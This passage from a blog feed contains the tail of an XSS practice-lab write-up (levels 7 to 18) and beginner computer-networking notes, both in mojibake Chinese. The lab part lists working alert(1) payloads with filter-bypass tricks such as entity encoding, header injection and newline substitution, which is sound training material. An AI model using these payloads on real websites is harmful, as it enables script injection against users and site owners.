plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,onï¼Œsrcï¼Œdataï¼Œhrefï¼Œå¤§å°å†™å¤±æ•ˆï¼Œâ€è¢«ç¼–ç æ‰€ä»¥valueå¤„å‡ ä¹æ‰¾ä¸åˆ°</p><p>ä½†ä¸‹é¢é“¾æ¥å¤„å¯ä»¥çœ‹åˆ° &lt;&gt; â€˜ % # &amp; æœªè¢«è¿‡æ»¤ çœ‹äº†åˆ«äººé¢˜è§£ä¹‹åæ˜¯<strong>htmlå®ä½“ç¼–ç ç»•è¿‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¸äº†è§£ï¼Œå»çœ‹äº†æºç æ˜¯<strong>å¾—åŠ http://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>è¿™çœŸæƒ³ä¸å‡ºæ¥</p><p>è¯•äº†ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç°åªæœ‰æœ€åä¸€ä¸ªå¯ä»¥å†™å…¥ï¼Œ<strong>ç›´æ¥æ„é€ </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>è¿™ä¸ªé¢˜åº”è¯¥æ˜¯æŠ“åŒ…çœ‹ï¼Œä½†ç”±äºæˆ‘æ˜¯è°·æ­Œåšé¢˜ï¼Œç«ç‹æŠ“åŒ…ï¼Œå¯¼è‡´æ¯æ¬¡ç›´æ¥å¤åˆ¶11é¢˜urlå®ƒéƒ½ä¸ä¼šç›´æ¥æŠ“åˆ°refå¤´ï¼Œæ­£ç¡®åº”è¯¥æ˜¯åœ¨10é¢˜å‘11é¢˜è·³è½¬æ—¶æŠ“åŒ…ã€‚</p><p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>æŠŠrefå¤´æ”¹æˆè¿™ä¸ªï¼Œå‘åŒ…å³å¯</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>æœ‰äº†ä¸Šä¸€ä¸ªé¢˜çš„æç¤ºï¼Œè¿™ä¸ªé¢˜å°±æ˜æ˜¾å¾ˆå¤šäº†</p><p>åªè¦æ”¹ä¸€ä¸‹UAå¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>è¿™ä¸ªåº”è¯¥æ˜¯æ”¹cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>é“¾æ¥å¥½åƒæ˜¯æŒ‚æ‰äº†ï¼Œä½†å¥½åƒæ˜¯æ²¡æœ‰å¤ªçœ‹æ‡‚ï¼Œå›å¤´å†æ¥çœ‹ä¸€ä¸‹</p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>çœ‹æºç å‘ç°</p><p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p><p>ç„¶åä¸Šç½‘æŸ¥ä¸€ä¸‹</p><p><strong>ng-include</strong> æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p><p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p><p><code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨<strong>åŒä¸€ä¸ªåŸŸå</strong>ä¸‹ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´srcåŒ…å«çš„å†…å®¹ä¼šè¿›å…¥ng-includeè¢«åŒ…å«</p><p>é‚£æˆ‘ä»¬å¯ä»¥æƒ³å‡ºèƒ½ä¸èƒ½ç›´æ¥é—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><p>ä½†å‘ç°ç›´æ¥è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½åŒ…å«ç¬¬ä¸€å…³ä»£ç </p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>è¿™ä¸ªé¢˜æ˜¯æŠŠç©ºæ ¼è¿‡æ»¤äº†</p><p>ç”¨%0då’Œ%0aç»•è¿‡</p><p><strong>%0aæ¢è¡Œç¬¦å·â€\nâ€<br>%0då›è½¦ç¬¦å·â€\râ€</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>å°±æ‰¾æºç å’Œurlä¹‹é—´çš„å…³ç³»</p><p>å¯ä»¥çœ‹è§åœ¨srcå¤„æœ‰ä¸åŒ</p><p>&lt;&gt;è¢«è¿‡æ»¤ï¼Œè€ƒè™‘onäº‹ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>å’Œ17å…³ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- åå¼•å·ä»£æ›¿åœ†æ‹¬å·</span><br><span class="line">- æ¢è¡Œç»•è¿‡æ­£åˆ™</span><br><span class="line">- &lt;!--ä¸ä»…å¯ä»¥ç”¨--&gt;,ä¹Ÿå¯ä»¥ç”¨--!&gt;é—­åˆ</span><br><span class="line">- &#x2F;&#x2F;å¯ä»¥ç”¨æ¢è¡Œæ¥ç»•è¿‡</span><br><span class="line">- &lt;!--å’Œ--&gt;éƒ½å¯ä»¥åœ¨htmlçš„scriptæ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Š</span><br><span class="line">- Å¿ ç¬¦å·è½¬æ¢ä¸ºå¤§å†™åæ­£å¥½ä¸ºå¤§å†™å­—æ¯ S</span><br><span class="line">- å¯ä»¥ç”¨ %0a ä»£æ›¿ç©ºæ ¼è¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´&lt;/p&gt;
&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;h2 id=&quot;åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="xss" scheme="https://pz1o.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>è®¡ç½‘</title>
    <link href="https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/"/>
    <id>https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/</id>
    <published>2020-12-09T15:29:40.000Z</published>
    <updated>2020-12-09T15:32:12.091Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº†</p><p>åé¢å­¦äº†ä½†å¥½åƒä¸¢äº†</p><p>çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡</p><h1 id="è®¡ç½‘åˆå­¦"><a href="#è®¡ç½‘åˆå­¦" class="headerlink" title="è®¡ç½‘åˆå­¦"></a>è®¡ç½‘åˆå­¦</h1><h2 id="TCP-IPåˆ†å±‚æ¨¡å‹"><a href="#TCP-IPåˆ†å±‚æ¨¡å‹" class="headerlink" title="TCP/IPåˆ†å±‚æ¨¡å‹"></a><strong>TCP/IPåˆ†å±‚æ¨¡å‹</strong></h2><div class="table-container"><table><thead><tr><th>åº”ç”¨å±‚ï¼ˆç¬¬äº”å±‚)</th></tr></thead><tbody><tr><td><strong>ä¼ è¾“å±‚ï¼ˆç¬¬å››å±‚ï¼‰</strong></td></tr><tr><td><strong>äº’è”ç½‘å±‚ï¼ˆç¬¬ä¸‰å±‚ï¼‰</strong></td></tr><tr><td><strong>ç½‘è·¯æ¥å£å±‚ï¼ˆç¬¬äºŒå±‚ï¼‰</strong></td></tr><tr><td><strong>ç‰©ç†å±‚ï¼ˆç¬¬ä¸€å±‚ï¼‰</strong></td></tr></tbody></table></div><p>ç‰©ç†å±‚ï¼šå¯¹åº”äºç½‘ç»œçš„åŸºæœ¬ç¡¬ä»¶ï¼Œå³æˆ‘ä»¬å¯ä»¥çœ‹å¾—è§çš„ç¡¬ä»¶è®¾å¤‡ã€‚</p><p>ç½‘ç»œæ¥å£å±‚ï¼šå®šä¹‰äº†å°†æ•°æ®ç»„æˆæ­£ç¡®å¸§çš„è§„ç¨‹å’Œåœ¨ç½‘ç»œä¸­ä¼ è¾“å¸§çš„è§„ç¨‹ã€‚</p><p>äº’è”ç½‘å±‚ï¼šæœ¬å±‚å®šä¹‰äº†äº’è”ç½‘ä¸­ä¼ è¾“çš„ä¿¡æ¯åŒ…çš„æ ¼å¼ï¼Œä»¥åŠä»ä¸€ä¸ªç”¨æˆ·é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªè·¯ç”±å™¨åˆ°æœ€ç»ˆç›®æ ‡çš„ä¿¡æ¯åŒ…è½¬å‘æœºåˆ¶ã€‚</p><p>ä¼ è¾“å±‚ï¼šä¸ºä¸¤ä¸ªç”¨æˆ·è¿›ç¨‹ä¹‹é—´å»ºç«‹ï¼Œç®¡ç†å’Œæ‹†é™¤å¯é è€Œåˆæœ‰æ•ˆçš„ç«¯åˆ°ç«¯çš„è¿æ¥ã€‚</p><p>åº”ç”¨å±‚ï¼šå®šä¹‰äº†åº”ç”¨ç¨‹åºä½¿ç”¨äº’è”ç½‘çš„è§„ç¨‹ã€‚</p><h2 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h2><p>ipåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†</p><p>ç½‘ç»œæ ‡è¯†ï¼šç”¨ä»¥æ ‡æ˜å…·ä½“çš„ç½‘ç»œæ®µ</p><p>ä¸»æœºæ ‡è¯†ï¼šæŸä¸ªç½‘ç»œä¸­å¾…å®šçš„è®¡ç®—æœºå·ç </p><p>ç½‘ç»œæ ‡è¯†ï¼š210.73.140.0</p><p>ä¸»æœºæ ‡è¯†ï¼š                    2</p><p>åˆèµ·æ¥å†™ï¼š210.73.140.2</p><p>äººä»¬æŒ‰ç…§ç½‘ç»œè§„æ¨¡çš„å¤§å°ï¼ŒæŠŠ32ä¸ºåœ°å€ä¿¡æ¯è®¾æˆ3ç§å®šä½çš„åˆ’åˆ†æ–¹å¼ï¼Œä¸‰ç§åˆ’åˆ†æ–¹æ³•åˆ†åˆ«å¯¹åº”äºAï¼ŒBï¼ŒCç±»IPåœ°å€ï¼ŒIPåœ°å€åˆ†ä¸ºç½‘ç»œå·å’Œä¸»æœºå·ä¸¤éƒ¨åˆ†</p><p>ï¼ˆ1ï¼‰Aç±»IPåœ°å€ï¼ˆ1-126ï¼‰</p><p>è¯¥åœ°å€ç”±1å­—èŠ‚ç½‘ç»œåœ°å€å’Œ3å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯0ã€‚</p><p>ï¼ˆ2ï¼‰Bç±»IPåœ°å€ï¼ˆ128-191ï¼‰</p><p>è¯¥åœ°å€ç”±2å­—èŠ‚ç½‘ç»œåœ°å€å’Œ2å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯10ã€‚</p><p>ï¼ˆ3ï¼‰Cç±»IPåœ°å€ï¼ˆ192-223ï¼‰</p><p>è¯¥åœ°å€ç”±3å­—èŠ‚ç½‘ç»œåœ°å€å’Œ1å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯110ã€‚</p><p>ï¼ˆ4ï¼‰Dç±»IPåœ°å€ï¼ˆ224-239ï¼‰</p><p>å¤šç‚¹å¹¿æ’­åœ°å€ï¼Œç”¨äºIPç»„æ’­ã€‚</p><p>ï¼ˆ5ï¼‰Eç±»IPåœ°å€ï¼ˆ240-225ï¼‰</p><p>ä¿ç•™åœ°å€ï¼Œç”¨ä½œç‰¹æ®Šç”¨é€”ã€‚</p><p>ï¼ˆ0.0.0.0ï¼‰å¯¹åº”å½“å‰ä¸»æœºï¼Œï¼ˆ255.255.255.255ï¼‰æ˜¯å½“å‰å­ç½‘çš„ä¼ æ’­åœ°å€ã€‚</p><h2 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h2><p>é¡¶çº§åŸŸå .com</p><p>äºŒçº§åŸŸå test.com</p><p>ä¸‰çº§åŸŸå test.cn.com</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p><h2 id="DNSæœåŠ¡å™¨"><a href="#DNSæœåŠ¡å™¨" class="headerlink" title="DNSæœåŠ¡å™¨"></a>DNSæœåŠ¡å™¨</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p><h1 id="è®¡ç½‘å­¦ä¹ "><a href="#è®¡ç½‘å­¦ä¹ " class="headerlink" title="è®¡ç½‘å­¦ä¹ "></a>è®¡ç½‘å­¦ä¹ </h1><h2 id="ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"></a>ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°</h2><p>å±€åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´å°  è‡ªå·±èŠ±é’±ä¹°è®¾å¤‡  å¸¦å®½å›ºå®š</p><p>å¹¿åŸŸç½‘ï¼šè·ç¦»è¿œ èŠ±é’±ä¹°æœåŠ¡</p><p>Internet ï¼šæœ‰è‡ªå·±çš„æœºæˆ¿  å¯¹ç½‘æ°‘æä¾›è¿æ¥ã€‚</p><p>IPåœ°å€ï¼šç½‘ç»œä¸­çš„åœ°å€ã€‚</p><p>ç‰©ç†åœ°å€ï¼šMacåœ°å€ï¼Œç”µè„‘å‡ºå‚æ—¶å·²å›ºå®šã€‚</p><p>ç½‘å…³ï¼šä¸‹å›¾ä¸­çš„Gå°±æ˜¯ç½‘å…³ï¼Œç›¸å½“äºç½‘ç»œä¸­çš„ä¸€ä¸ªå…³å¡ã€‚ç½‘å…³åœ°å€ä¸ºGçš„IPåœ°å€ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p><div class="table-container"><table><thead><tr><th>æœ¬æœºip</th><th>è®¿é—®ip</th><th>æœ¬æœºmac</th><th>ä¸‹æ¬¡è®¿é—®mac</th></tr></thead><tbody><tr><td>15.0.0.2</td><td>13.0.0.2</td><td>m4</td><td>m5</td></tr></tbody></table></div><p><strong>OSIå‚è€ƒæ¨¡å‹</strong></p><ul><li>åº”ç”¨å±‚ï¼šèƒ½äº§ç”Ÿç½‘ç»œæµé‡çš„ç¨‹åº</li><li>è¡¨ç¤ºå±‚ï¼šåœ¨ä¼ è¾“ä¹‹å‰æ˜¯å¦åŠ å¯†æˆ–å‹ç¼©å¤„ç†</li><li>ä¼šè¯å±‚ï¼šæŸ¥æ­£åœ¨è¿›è¡Œä¼šè¯çš„ç¨‹åº netstat -nb</li><li>ä¼ è¾“å±‚ï¼šå¯é ä¼ è¾“ï¼ˆTCPï¼‰å’Œæµé‡æ§åˆ¶ ä¸å¯é ä¼ è¾“ï¼ˆUDPï¼‰</li><li>ç½‘ç»œå±‚ï¼šé€‰æ‹©æœ€ä½³è·¯å¾„ è§„åˆ’IPåœ°å€</li><li>æ•°æ®é“¾è·¯å±‚ï¼šå¸§çš„å¼€å§‹å’Œç»“æŸã€‚å·®é”™æ£€æŸ¥ã€‚</li><li>ç‰©ç†å±‚ï¼šæ¥å£æ ‡å‡†å’Œç”µå™¨æ ‡å‡†</li></ul><p><strong>OSIå‚è€ƒæ¨¡å‹ç½‘ç»œæ’é”™æŒ‡å¯¼</strong></p><ol><li>ç‰©ç†å±‚æ•…éšœï¼šæŸ¥çœ‹è¿æ¥çŠ¶æ€ï¼Œå‘é€å’Œæ¥å—çš„æ•°æ®åŒ…</li><li>æ•°æ®é“¾è·¯å±‚ï¼šMACåœ°å€å†²çªã€ç½‘é€Ÿåå•†ä¸ä¸€è‡´ã€è®¡ç®—æœºVLANé”™è¯¯</li><li>ç½‘ç»œå±‚æ•…éšœï¼šé…ç½®é”™è¯¯çš„IPåœ°å€ å­ç½‘æ©ç å’Œé”™è¯¯çš„ç½‘å…³</li><li>åº”ç”¨å±‚æ•…éšœï¼šåº”ç”¨é”™è¯¯ä»£ç†ã€‚</li></ol><p>æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…ï¼špingä¸€ä¸ªç½‘å€</p><p><strong>OSIå‚è€ƒæ¨¡å‹å’Œç½‘ç»œå®‰å…¨</strong></p><ol><li>ç‰©ç†å±‚å®‰å…¨</li><li>æ•°æ®é“¾è·¯å±‚å®‰å…¨ï¼šç™»å½•éœ€è¦è´¦å·å’Œå¯†ç </li><li>ç½‘ç»œå±‚å®‰å…¨ï¼šè·¯ç”±å™¨é™åˆ¶æ•°æ®åŒ…æµé‡</li><li>åº”ç”¨å±‚å®‰å…¨ï¼šå¼€å‘ç¨‹åºæœ‰æ²¡æœ‰æ¼æ´<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p><h2 id="ç¬¬äºŒç« -ç‰©ç†å±‚"><a href="#ç¬¬äºŒç« -ç‰©ç†å±‚" class="headerlink" title="ç¬¬äºŒç«  ç‰©ç†å±‚"></a>ç¬¬äºŒç«  ç‰©ç†å±‚</h2><h3 id="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"><a href="#0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"></a>0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ</h3><p>ç‰©ç†å±‚è§£å†³å¦‚ä½•è¿æ¥åœ¨å„ç§è®¡ç®—æœºçš„<strong>ä¼ è¾“åª’ä½“ä¸Š</strong>ä¼ è¾“<strong>æ•°æ®æ¯”ç‰¹æµ</strong>ï¼Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚</p><p>ç‰©ç†å±‚ä¸»è¦æ˜¯ç¡®å®šä¼ è¾“åª’ä½“çš„æ¥å£çš„ä¸€äº›ç‰¹æ€§ã€‚æœ‰æœºæ¢°ï¼Œç”µå™¨ï¼ŒåŠŸèƒ½ï¼Œè¿‡ç¨‹ç‰¹æ€§ã€‚</p><h3 id="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"><a href="#0x02æ•°æ®é€šä¿¡çŸ¥è¯†" class="headerlink" title="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"></a>0x02æ•°æ®é€šä¿¡çŸ¥è¯†</h3><p><strong>æ•°æ®é€šä¿¡æ¨¡å‹</strong>ï¼š</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p><p>æ•°æ®ï¼šè¿é€æ¶ˆæ¯çš„å®ä½“ã€‚</p><p>ä¿¡å·ï¼šæ•°æ®ç”µæ°”æˆ–ç”µç£çš„è¡¨ç°ã€‚</p><p>ä¿¡é“ï¼šè¡¨ç¤ºä¸€ä¸ªæ–¹å‘ä¼ é€ä¿¡æ¯çš„åª’ä½“ã€‚</p><p>å•å‘é€šä¿¡ï¼ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ŒåŒå‘åŒæ—¶é€šä¿¡ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p><h3 id="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"><a href="#0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“" class="headerlink" title="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"></a>0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“</h3><p>æ— å±è”½åŒç»çº¿UTP</p><p>å±è”½åŒç»çº¿STP</p><p>åŒè½´ç”µç¼†</p><p>å…‰çº¤</p><p>å¾®æ³¢ä¼ è¾“</p><p>ç‰©ç†å±‚è®¾å¤‡â€”é›†çº¿å™¨</p><h3 id="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"><a href="#0x04ä¿¡é“å¤ç”¨æŠ€æœ¯" class="headerlink" title="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"></a>0x04ä¿¡é“å¤ç”¨æŠ€æœ¯</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p><h3 id="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"><a href="#0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ" class="headerlink" title="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"></a>0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ</h3><h3 id="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"><a href="#0x06å®½å¸¦æ¥å…¥æŠ€æœ¯" class="headerlink" title="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"></a>0x06å®½å¸¦æ¥å…¥æŠ€æœ¯</h3><p>ADSL</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p><p>å…‰çº¤</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p><h2 id="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"><a href="#ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚" class="headerlink" title="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"></a>ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚</h2><h3 id="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"><a href="#0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"></a>0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" alt="image-20200615185534103"></p><p>æ•°æ®é“¾è·¯å±‚ä¿¡é“ç±»å‹ï¼šç‚¹åˆ°ç‚¹å’Œå¹¿æ’­ã€‚</p><p>é“¾è·¯ï¼šæ˜¯ä¸€æ¡ç‚¹åˆ°ç‚¹çš„ç‰©ç†çº¿è·¯æ®µã€‚</p><p>æ•°æ®é“¾è·¯ï¼šé™¤äº†ç‰©ç†çº¿è·¯å¤–ï¼Œè¿˜å¿…é¡»æœ‰é€šä¿¡åè®®æ¥æ§åˆ¶è¿™äº›æ•°æ®çš„ä¼ è¾“ã€‚</p><p>å¸§ï¼šå¸§å¤´ å¸§å°¾ macåœ°å€ æ ¡éªŒç </p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p><h3 id="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"><a href="#0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜" class="headerlink" title="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"></a>0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜</h3><p>1.å°è£…æˆå¸§</p><p>2.é€æ˜ä¼ è¾“ï¼ˆå°†è½¬ä¹‰å­—ç¬¦è½¬ä¹‰ï¼‰</p><p>3.å·®é”™æ§åˆ¶</p><p><img 